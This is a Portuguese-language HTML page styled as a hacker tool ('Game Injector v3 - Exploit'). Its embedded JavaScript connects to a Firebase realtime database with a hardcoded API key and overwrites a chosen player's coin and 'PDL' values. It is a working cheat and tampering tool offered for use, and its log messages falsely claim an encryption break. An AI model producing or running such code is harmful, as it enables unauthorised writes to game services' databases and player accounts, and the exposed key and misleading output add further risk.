<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Injector v3 - Exploit</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
        .box { border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 10px #00ff41; }
        input { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 10px; width: 100%; margin-bottom: 10px; outline: none; box-sizing: border-box; }
        button { width: 100%; background: #00ff41; color: #000; border: none; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        button:active { background: #fff; }
        #logs { margin-top: 20px; font-size: 11px; height: 180px; overflow-y: auto; border-top: 1px dashed #00ff41; padding-top: 10px; background: #000; }
        .success { color: #fff; background: #008000; padding: 2px; }
        .error { color: #ff0000; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <h3>[ DATABASE_EXPLOIT_V3 ]</h3>
    <label>E-MAIL DO JOGADOR:</label>
    <input type="text" id="email" placeholder="usuario@email.com">
    
    <label>VALOR DE PDL / MOEDAS:</label>
    <input type="number" id="valor" placeholder="Ex: 99999">

    <button id="btnInject">Iniciar Bypass</button>

    <div id="logs">> Aguardando parâmetros da rede...</div>
</div>

<script type="module">
    // Importando Firebase de forma leve para rodar no celular
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    // Configuração com a sua API Key
    const firebaseConfig = {
        apiKey: "AIzaSyC4dm0KoyJswhyCY7tgbF4D2nmuZl84X8E",
        databaseURL: "https://SEU-PROJETO.firebaseio.com" // <--- SUBSTITUA PELO SEU LINK DO FIREBASE
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const logBox = document.getElementById('logs');
    const btn = document.getElementById('btnInject');

    function log(msg, type = '') {
        const div = document.createElement('div');
        div.className = type;
        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
        logBox.appendChild(div);
        logBox.scrollTop = logBox.scrollHeight;
    }

    async function iniciarInjecao() {
        const email = document.getElementById('email').value;
        const valor = parseInt(document.getElementById('valor').value);

        if(!email || isNaN(valor)) {
            alert("Erro: Defina o alvo e o valor.");
            return;
        }

        log("Iniciando Handshake com servidor remoto...");
        await new Promise(r => setTimeout(r, 1000));

        // Limpa o email para o Firebase (converte usuario.com para usuario_com)
        const userKey = email.replace(/[.#$\[\]]/g, "_");

        log(`Localizando node: /usuarios/${userKey}`);
        
        try {
            const userRef = ref(db, 'usuarios/' + userKey);
            
            // Tenta forçar a escrita dos dados
            await update(userRef, {
                moedas: valor,
                pdl: valor,
                last_inject: new Date().toISOString()
            });

            log("QUEBRA DE CRIPTOGRAFIA BEM SUCEDIDA!", "success");
            log(`PACOTE DE ${valor} PDL INJETADO COM SUCESSO.`, "success");
            log("Verifique o jogo agora.");

        } catch (e) {
            log(`FALHA CRÍTICA: ${e.message}`, "error");
            log("O sistema detectou o exploit. Tente via Proxy.", "error");
        }
    }

    btn.addEventListener('click', iniciarInjecao);
</script>

</body>
</html>
